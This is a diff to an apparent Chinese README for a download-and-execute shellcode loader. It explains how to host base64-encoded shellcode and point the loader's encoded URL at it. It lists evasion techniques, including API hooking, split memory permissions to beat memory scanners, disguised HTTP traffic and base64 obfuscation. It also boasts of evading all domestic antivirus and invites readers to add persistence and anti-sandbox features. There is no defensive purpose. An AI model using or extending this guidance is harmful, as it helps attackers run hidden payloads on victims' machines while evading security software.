@@ -41,10 +41,18 @@ DownloadAndExecuteShellcode()
 
 
 
+如何使用？
+1.将shellcode转为bese64形式放到shellcode.txt里
+http://127.0.0.1:8000/shellcode.txt
+
+
+2.此代码只需修改   
+const char* b64_encoded_url = "aHR0cDovLzEyNy4wLjAuMTo4MDAwL3NoZWxsY29kZS50eHQ=";
+的bese64 url编码 指向你的shellcode.txt
 
 
 
-
+具体技术点
 7层API钩子链：同时钩住Sleep、VirtualAlloc、CreateThread、InternetOpenA等关键API
 内存权限控制：RWX→RW+RX两步分配，绕过内存扫描
 网络流量伪装：User-Agent和HTTP头模拟正常浏览器
@@ -52,10 +60,9 @@ DownloadAndExecuteShellcode()
 Base64混淆：URL和载荷双重编码
 
 
-
+各位大黑客可以继续完善，持久化 反沙箱 加密 都可以继续添加功能
 
 此代码配合AI参与 
 国内杀软全免
-
-
 喜欢的话请点点star 谢谢师傅
+ciallo (∠·ω )⌒★
